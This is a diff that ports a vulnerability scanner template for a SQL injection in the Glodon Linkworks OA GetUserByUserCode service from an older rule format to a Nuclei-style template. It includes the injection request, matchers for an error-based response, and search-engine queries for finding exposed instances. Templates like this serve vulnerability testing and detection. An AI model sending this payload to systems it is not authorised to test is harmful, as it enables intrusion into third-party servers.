@@ -1,26 +1,32 @@
-id: glodon-linkworks-Getuserbyusercode-sqli
+id: glodon-linkworks-getuserbyusercode-sqli
 
 info:
-  name: 广联达oa Linkworks Getuserbyusercode 存在SQL注入
-  author: hufei,Y3y1ng
+  name: 广联达OA linkworks getuserbyusercode sql注入
+  author: hufei
   severity: high
-  verified: true
-  description: |
-    广联达 Linkworks办公OA Getuserbyusercode 存在sql注入
-    fofa: body="/Services/Identification/"
-    hunter: web.body="/Services/Identification/"
-  reference:
-    - https://github.com/iamHuFei/HVVault/blob/main/docs/%E5%B9%BF%E8%81%94%E8%BE%BE/glodon-linkworks-getuserbyusercode-sqli.yaml
-  tags: glodon,linkworks,sqli,oa
-  created: 2023/09/18
+  description: 广联达OA linkworks getuserbyusercode sql注入
+  metadata:
+   verified: true
+   fofa-query: body="/Services/Identification/"
+   hunter-query: web.body="/Services/Identification/"
+  tags: glodon,sqli,oa,linkworks
 
-rules:
-  r0: #验证SQL注入
-    request:
-      method: GET
-      path: /Org/service/Service.asmx/GetUserByUserCode?userCode=1%27-1/user--%27&EncryptData=1
-    expression: >
-      response.status == 500 && 
-      response.body.bcontains(b"nvarchar") &&
-      response.body.bcontains(b"39")
-expression: r0()
+http:
+  - raw:
+      - |
+        GET /Org/service/Service.asmx/GetUserByUserCode?userCode=1%27-1/user--%27&EncryptData=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Cookie: ASP.NET_SessionId=n55kuckffdyrkrvnx2ehmdgh; GTP_IdServer_LangID=2052
+        Upgrade-Insecure-Requests: 1
+        Pragma: no-cache
+        Cache-Control: no-cache
+
+    matchers:
+      - type: dsl
+        dsl:
+         - "status_code == 500 && contains_all(body,'nvarchar','#39')"
